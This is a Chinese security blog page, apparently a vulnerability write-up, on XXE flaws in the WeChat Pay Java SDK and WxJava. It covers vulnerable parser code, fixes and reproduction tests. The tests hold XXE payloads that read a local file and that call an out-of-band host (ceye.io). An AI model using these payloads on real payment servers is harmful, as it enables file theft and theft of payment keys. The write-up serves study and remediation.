@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="纯净水@流云-自留地">
+    <link rel="shortcut icon" href="http://some.url/to/favicon.ico">
+    <title>XXE 示例及利用-java—SDK-1-Adagio</title>
+    
+        
+            <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+            <link href="https://cdn.bootcss.com/academicons/1.8.6/css/academicons.min.css" rel="stylesheet">
+            <link href="https://cdn.bootcss.com/font-awesome/5.9.0/css/all.min.css" rel="stylesheet">
+            <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+        
+    
+    <link rel="stylesheet" href="/css/adagio.css">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<body>
+    <div class="container-fluid">
+    <nav class="nav">
+        <div class="collapse navbar-collapse" id="navbar-sm">
+            
+            
+            <div class="navbar-nav">
+                <a href="https://hexo.io" class="nav-item nav-link">Hexo</a>
+            </div>
+            
+            <div class="navbar-nav">
+                <a href="http://www.hanlindong.com" class="nav-item nav-link">Adagio's author</a>
+            </div>
+            
+        </div>
+    </nav>
+</div>
+
+<div class="d-flex d-md-none" style="width: 100%; background-color: #e9ecef">
+    
+    <div class="nav">
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar-sm"
+            aria-expanded="false" aria-label="Toggle Navigation">
+            <i class="fas fa-bars fa-lg"></i>
+        </button>
+    </div>
+    
+    <nav class="navbar ml-auto">
+        <a class="navbar-brand" href="/">
+            
+            <img class="logo" src="https://via.placeholder.com/100x50.png?text=logo" />
+            
+        </a>
+    </nav>
+</div>
+
+
+<div class="container d-none d-md-block my-navbar">
+    <nav class="navbar navbar-expand-sm navbar-light bg-transparent">
+        <a class="navbar-brand " href="/">
+            
+            <img class="logo" src="https://via.placeholder.com/100x50.png?text=logo" />
+            
+        </a>
+        
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
+            aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav">
+                
+                <li class="nav-item pl-2 pr-2 ">
+                    <a class="nav-link" href="https://hexo.io">Hexo</a>
+                </li>
+                
+                <li class="nav-item pl-2 pr-2 ">
+                    <a class="nav-link" href="http://www.hanlindong.com">Adagio's author</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+    </nav>
+</div>
+
+
+
+
+    <div class="jumbotron jumbotron-fluid">
+    <div class="container">
+        
+        <h1 class="mt-4 article-title page-title">XXE 示例及利用-java—SDK-1</h1>
+        
+        <p class="lead text-gray mt-3">By Anonymous; Published on 2019-01-28</p>
+        
+        <div class="tags">
+            <ul class="tag-list">
+                
+                <li class="tag-list-item">
+                    <a class="tag-list-link" href="/tags/Web渗透/">Web渗透</a>
+                </li>
+                
+                <li class="tag-list-item">
+                    <a class="tag-list-link" href="/tags/XXE 实例利用/">XXE 实例利用</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+    </div>
+</div>
+    <div class="container">
+        <div class="row">
+            <div class="col-md-9 pt-2">
+                <div class="row">
+                    <div class="col-12">
+                        <main>
+                            <article class="article-text page-content"><p>[TOC]</p>
+<h1 id="XXE实例分析"><a href="#XXE实例分析" class="headerlink" title="XXE实例分析"></a>XXE实例分析</h1><p>在接着之前对XXE的了解和学习，但一直在实战中都没遇到，正好这段时间在同事的渗透工作中又遇到了微信SDK的XXE漏洞，便趁着这个机会结合之前对微信SDK中的XXE漏洞，总结一波。</p>
+<h2 id="ex1"><a href="#ex1" class="headerlink" title="ex1"></a>ex1</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ul>
+<li>微信SDK XXE漏洞分析1</li>
+</ul>
+<p>没有找到原漏洞代码，看到原漏洞修复后代码：</p>
+<pre><code>https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip
+</code></pre><p>在这个案例中，漏洞逻辑为：<br>微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果，该接口接受XML格式的数据，攻击者可以构造恶意的回调数据（XML格式）来窃取商家服务器上的任何文件，一般支付服务器均为核心服务器，出现XXE导致任意文件。另外，一旦攻击者获得了关键支付的安全密钥（md5-key和商家信息，将可以直接实现0元支付购买任何商品。</p>
+<p>因为白盒分析java实在有点强人所难，所以站在前人的肩膀上，一步到位，先看看出现这个漏洞的函数：</p>
+<pre><code>src/main/java/com/github/wxpay/sdk/WXPayUtil文件
+public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception {
+        try {
+            Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;();
+            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();
+            InputStream stream = new ByteArrayInputStream(strXML.getBytes(&quot;UTF-8&quot;));
+            org.w3c.dom.Document doc = documentBuilder.parse(stream);
+            doc.getDocumentElement().normalize();
+            NodeList nodeList = doc.getDocumentElement().getChildNodes();
+            for (int idx = 0; idx &lt; nodeList.getLength(); ++idx) {
+                Node node = nodeList.item(idx);
+                if (node.getNodeType() == Node.ELEMENT_NODE) {
+                    org.w3c.dom.Element element = (org.w3c.dom.Element) node;
+                    data.put(element.getNodeName(), element.getTextContent());
+                }
+            }
+            try {
+                stream.close();
+            } catch (Exception ex) {
+                // do nothing
+            }
+            return data;
+        } catch (Exception ex) {
+            WXPayUtil.getLogger().warn(&quot;Invalid XML, can not convert to map. Error message: {}. XML content: {}&quot;, ex.getMessage(), strXML);
+            throw ex;
+        }
+
+    }
+</code></pre><p>这里 可以看出xmlToMap 方法用作将string转换成map,所用的xml解析器直接处理了xml字符串，这种直接处理xml字符串，在服务端没有禁止外部dtd应用的时候，造成了XXE漏洞。</p>
+<ul>
+<li><p>详情分析</p>
+<pre><code>Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;(); 
+这个地方使用了java 中的hashmap，（Hash算法就是根据某个算法将一系列目标对象转换成地址，当要获取某个元素的时候，只需要将目标对象做相应的运算获得地址，直接获取。）
+对hashmap不熟悉的朋友可以看一下 https://www.cnblogs.com/dreamroute/p/3843600.html
+</code></pre><p>关键解析出现在以下</p>
+<pre><code>org.w3c.dom.Document doc = documentBuilder.parse(stream);
+doc.getDocumentElement().normalize();
+</code></pre><p>其中，strXML的内存中数据流使用parse函数处理，跟踪parse函数</p>
+<pre><code>  public Document parse(InputStream is)
+      throws SAXException, IOException {
+      if (is == null) {
+          throw new IllegalArgumentException(&quot;InputStream cannot be null&quot;);
+      }
+
+      InputSource in = new InputSource(is);
+      return parse(in);
+  }
+</code></pre><p>return的parse（in） 类似于xml解析器 将xml转换为xmlDOM，涉及到到DOM解析XML，详情可以参考下</p>
+<pre><code>https://blog.csdn.net/guchuanhang/article/details/51866114
+</code></pre><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3></li>
+</ul>
+<p>测试代码</p>
+<pre><code>package com.github.wxpay.sdk;
+import java.util.Map;
+public class test1 {
+
+    public static void TestXxe(){
+        String xmlstr = &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt; \n&quot; +
+                &quot;&lt;!DOCTYPE xxe [\n&quot; +
+                &quot;&lt;!ELEMENT name ANY &gt;\n&quot; +
+                &quot;&lt;!ENTITY xxe SYSTEM \&quot;file://1.txt\&quot; &gt;]&gt;\n&quot; +
+                &quot;&lt;root&gt;\n&quot; +
+                &quot;&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&quot; +
+                &quot;&lt;/root&gt;&quot;;
+        try {
+            System.out.println(xmlstr);
+            System.out.println(&quot;+++++++++++++++++=&quot;);
+            //System.out.println(WXPayUtil.isSignatureValid(xmlstr,config.getkey()));
+            Map&lt;String,String&gt; hm = WXPayUtil.xmlToMap(xmlstr);
+            System.out.println(&quot;+++++++++++++++++=&quot;);
+            System.out.println(hm);
+
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+    }
+
+    public static void main(String[] argvs){
+        System.out.println(&quot;11111&quot;);
+        test2 test3 = new test2();
+        test3.Test2();
+        //WXPayUtil WXXxe = new WXPayUtil();//调用存在漏洞的代码
+        //WXXxe.mapToXml();
+        TestXxe();
+
+
+    }
+}
+</code></pre><p>在下载的漏洞示例代码中，已经是更新后的代码了，所以为了使漏洞复现，得注释掉其中部分禁止函数。</p>
+<p>当配置documentBuilderFactory.setFeature(“<a href="http://apache.org/xml/features/disallow-doctype-decl&quot;" target="_blank" rel="noopener">http://apache.org/xml/features/disallow-doctype-decl&quot;</a>, true)为true时， 完全禁止DTD实体的使用</p>
+<pre><code>在 com.github.wxpay.sdk.WXPayXmlUtil函数中，进行了安全配置
+documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); 
+
+报错：[Fatal Error] :2:10: 将功能 &quot;http://apache.org/xml/features/disallow-doctype-decl&quot; 设置为“真”时, 不允许使用 DOCTYPE。
+</code></pre><p>单独将该配置该为false，可以使用内部实体调用</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe &quot;11111111&quot; &gt;]&gt;
+&lt;root&gt;
+&lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/root&gt;
+
+正常反馈
+{name=111111}
+</code></pre><p>使用外部实体时，因为本例子中使用的其他防护措施中，导致了禁止外部实体,测试时可以将以下防护注释掉。这个时候就可以正常进行外部实体注入。</p>
+<h3 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h3><pre><code>src/main/java/com/github/wxpay/sdk/WXPayXmlUtil中
+
+documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
+        documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
+        documentBuilderFactory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
+        documentBuilderFactory.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);
+        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
+        documentBuilderFactory.setXIncludeAware(false);
+        documentBuilderFactory.setExpandEntityReferences(false);
+</code></pre><p>详情分析 参考：</p>
+<pre><code>http://xerces.apache.org/xerces2-j/features.html#external-general-entities
+https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5
+</code></pre><h2 id="ex2"><a href="#ex2" class="headerlink" title="ex2"></a>ex2</h2><p>在简单分析了2018/07/03左右爆出来的微信SDK XXE漏洞函数后，可以回头来看一下CVE-2018-20318和CVE-2019-5312这两个CVE。</p>
+<ul>
+<li>CVE-2018-20318</li>
+</ul>
+<p>先看最开始的这个CVE：<br>根据issus 889</p>
+<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>已修复后漏洞代码如下：</p>
+<pre><code>private Document getXmlDoc() {
+    if (this.xmlDoc != null) {
+      return this.xmlDoc;
+        }
+
+        try {
+          this.xmlDoc = DocumentBuilderFactory
+            .newInstance()
+            .newDocumentBuilder()
+          final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+          factory.setExpandEntityReferences(false);
+          this.xmlDoc = factory.newDocumentBuilder()
+            .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8)));
+          return xmlDoc;
+        } catch (SAXException | IOException | ParserConfigurationException e) {
+      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString);
+    }
+  }
+
+</code></pre><p>根据对比：<br>原漏洞代码：</p>
+<pre><code>private Document getXmlDoc() {
+    if (this.xmlDoc != null) {
+      return this.xmlDoc;
+        }
+
+        try {
+          this.xmlDoc = DocumentBuilderFactory
+            .newInstance()
+            .newDocumentBuilder()
+            .parse(new ByteArrayInputStream(this.xmlString.getBytes(StandardCharsets.UTF_8)));
+          return xmlDoc;
+        } catch (SAXException | IOException | ParserConfigurationException e) {
+      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + this.xmlString);
+    }
+  }
+</code></pre><p>这里可以明显看到，parse创建了解析器，但没有如上的对外部实体进行禁止</p>
+<p>坑点：</p>
+<p>在复现的时候，最好使用maven项目，用pom直接导入所需组件。这里需要补充一下</p>
+<pre><code>    &lt;dependency&gt;
+      &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;
+      &lt;artifactId&gt;xstream&lt;/artifactId&gt;
+      &lt;version&gt;1.4.7&lt;/version&gt;
+    &lt;/dependency&gt;
+</code></pre><p>测试payload：</p>
+<pre><code>public void testToMap() throws Exception {
+    WxPayOrderQueryResult result = new WxPayOrderQueryResult();
+    result.setXmlString(&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot; +
+            &quot; \n&quot; +
+            &quot;&lt;!DOCTYPE ANY [\n&quot; +
+            &quot;&lt;!ENTITY test SYSTEM \&quot;http://th9bvw.ceye.io\&quot; &gt;]&gt;\n&quot; +
+            &quot; \n&quot; +
+            &quot;&lt;root&gt;&amp;test;&lt;/root&gt; &quot;);
+    Map&lt;String, String&gt; map = result.toMap();
+    System.out.println(map);
+
+    //Assert.assertEquals(map.get(&quot;return_code&quot;), &quot;SUCCESS&quot;);
+    //Assert.assertEquals(map.get(&quot;attach&quot;), &quot;订单额外描述&quot;);
+
+  }
+</code></pre><p>进行函数跟踪tomap到 BaseWxPayResult.java</p>
+<pre><code>public Map&lt;String, String&gt; toMap() {
+    if (StringUtils.isBlank(this.xmlString)) {
+      throw new RuntimeException(&quot;xml数据有问题，请核实！&quot;);
+    }
+
+    Map&lt;String, String&gt; result = Maps.newHashMap();
+    Document doc = this.getXmlDoc();
+
+    try {
+      NodeList list = (NodeList) XPathFactory.newInstance().newXPath()
+        .compile(&quot;/xml/*&quot;)
+        .evaluate(doc, XPathConstants.NODESET);
+      int len = list.getLength();
+      for (int i = 0; i &lt; len; i++) {
+        result.put(list.item(i).getNodeName(), list.item(i).getTextContent());
+      }
+    } catch (XPathExpressionException e) {
+      throw new RuntimeException(&quot;非法的xml文本内容：&quot; + xmlString);
+    }
+
+    return result;
+  }
+</code></pre><p>追溯到 getXmlDoc</p>
+<p>可以在ceye上看到原漏洞导致的结果</p>
+<h3 id="修复措施-1"><a href="#修复措施-1" class="headerlink" title="修复措施"></a>修复措施</h3><p>修改配置</p>
+<pre><code>documentBuilderFactory.setExpandEntityReferences(false);
+</code></pre><p>查看下详情</p>
+<pre><code>public void setExpandEntityReferences(boolean expandEntityRef) {
+        this.expandEntityRef = expandEntityRef;
+    }
+</code></pre><p>这个初始化设置为true</p>
+<pre><code>  private boolean expandEntityRef = true;
+</code></pre><p>但是这样修复的后果就是没有什么用，导致了CVE-2019-5312的问题<br>实际中可以参照ex1中的修复 </p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul>
+<li>CVE-2019-5312<h2 id="ex3-–待补充"><a href="#ex3-–待补充" class="headerlink" title="ex3 –待补充"></a>ex3 –待补充</h2></li>
+<li>实际渗透测试生活中遇到的xxe漏洞 <h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3></li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><pre><code>https://xz.aliyun.com/t/2427
+https://mp.weixin.qq.com/s/xV7vtJmFL0FkPX05kiLNVw
+https://github.com/Wechat-Group/WxJava/issues/889
+https://github.com/Wechat-Group/WxJava/issues/903
+https://blog.csdn.net/u013224189/article/details/80902339
+</code></pre></article>
+                        </main>
+                        
+                        
+                    </div>
+                </div>
+                <div class="row mt-5 mb-5">
+                    <div class="col-12">
+                        <div class="row">
+    <div class="col">
+        <nav aria-label="paginator" class="paginator">
+            <ul class="pagination d-none d-md-flex pagination-lg justify-content-center">
+                <li class="page-item ">
+                    <a class="page-link"
+                        href="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/"
+                        aria-label="Previous">
+                        <span aria-hidden="true">&laquo;
+                            ETH 漏洞复现</span>
+                        <span class="sr-only">Previous</span>
+                    </a>
+                </li>
+                <li class="page-item ">
+                    <a class="page-link"
+                        href="/2019/01/22/移动端/frida1/"
+                        aria-label="Next">
+                        <span
+                            aria-hidden="true">frida理解与学习
+                            &raquo;</span>
+                        <span class="sr-only">Next</span>
+                    </a>
+                </li>
+            </ul>
+            <ul class="pagination d-md-none justify-content-center">
+                <li class="page-item ">
+                    <a class="page-link"
+                        href="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/"
+                        aria-label="Previous">
+                        <span aria-hidden="true">&laquo;
+                            ETH 漏洞复现</span>
+                        <span class="sr-only">Previous</span>
+                    </a>
+                </li>
+                <li class="page-item ">
+                    <a class="page-link"
+                        href="/2019/01/22/移动端/frida1/"
+                        aria-label="Next">
+                        <span
+                            aria-hidden="true">frida理解与学习
+                            &raquo;</span>
+                        <span class="sr-only">Next</span>
+                    </a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+</div>
+
+
+
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-12">
+                        <div id="vcomment"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="container pt-4 page-sidebar">
+                    
+                    <div class="row">
+    <div class="col">
+        <h6>APPLAUSE FOR ME</h6>
+        <div id="applause-easy"></div>
+    </div>
+</div>
+                    
+                    <hr class="row">
+                    <div class="row toc-container">
+                        <div class="col-12">
+                            <h6>NAVIGATION</h6>
+                            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE实例分析"><span class="toc-text">XXE实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ex1"><span class="toc-text">ex1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复措施"><span class="toc-text">修复措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ex2"><span class="toc-text">ex2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理-1"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复措施-1"><span class="toc-text">修复措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-1"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ex3-–待补充"><span class="toc-text">ex3 –待补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理-2"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现-2"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol></li></ol>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>
+    <div class="jumbotron jumbotron-fluid mb-0">
+        <div class="container-fluid">
+            <div class="col text-center">
+                <div class="bottom-social">
+                    <div class="row">
+    <div class="col text-center">
+        <ul class="list-inline">
+            
+            <li class="list-inline-item">
+                
+                <a href="https://github.com/xxxxx">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+            <li class="list-inline-item">
+                
+                <a href="https://www.facebook.com/xxxxx">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+            <li class="list-inline-item">
+                
+                <a href="https://www.pinterest.com/xxxxx">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-pinterest-p fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+            <li class="list-inline-item">
+                
+                <a href="https://www.linkedin.com/in/xxxxx">
+                    <span class="fa-stack fa-2x icon-link">
+                        <i class="fas fa-circle fa-stack-2x"></i>
+                        <i class="fab fa-linkedin-in fa-stack-1x fa-inverse"></i>
+                    </span>
+                </a>
+                
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+                </div>
+                <p class="copyright text-muted">
+                    Copyright &copy; 吾善养浩然气
+                    <br>
+                    Thanks for coming!
+                    <br>
+                    <a href="https://github.com/Hanlin-Dong/hexo-theme-adagio">Adagio</a> - A <a href="https://hexo.io">Hexo</a> theme made with love by
+                    <a href="http://www.hanlindong.com">Hanlin Dong</a>.
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+    
+    
+        <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.slim.min.js"></script>
+        <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdn.bootcss.com/font-awesome/5.9.0/js/all.min.js"></script>
+         
+            <script type="text/x-mathjax-config">
+                MathJax.Hub.Config({
+                    CommonHTML: { linebreaks: { automatic: true } },
+                    "HTML-CSS": { linebreaks: { automatic: true } },
+                    SVG: { linebreaks: { automatic: true } }
+                });
+            </script>
+            <script src='https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+        
+    
+
+
+<script src="/js/av.min.js"></script>
+<script src="/js/valine.min.js"></script>
+<script src="/js/applause-easy.js"></script>
+
+<script>
+$(document).ready(function() {
+    var a = new ApplauseEasy({
+        id: 'applause-easy',
+        appId: "xxxxxxxxxx",
+        appKey: "xxxxxxxxxx",
+        img_src: "http://img.hanlindong.com/blog/site/clap.png",
+        img_width: "50px",
+        img_height: "50px"
+    })
+})
+</script>
+
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?123456789";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-11111111-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
+    gtag('config', 'UA-11111111-1');
+</script>
+
+
+    
+    <script>
+    new Valine({
+        el: "#vcomment",
+        appId: "xxxxxxxxxx",
+        appKey: "xxxxxxxxxx",
+        notify: false,
+        varify: false,
+        avatar: 'identicon',
+        placeholder: "",
+        recordIP: true
+    })
+</script>
+    
+</body>
+</html>
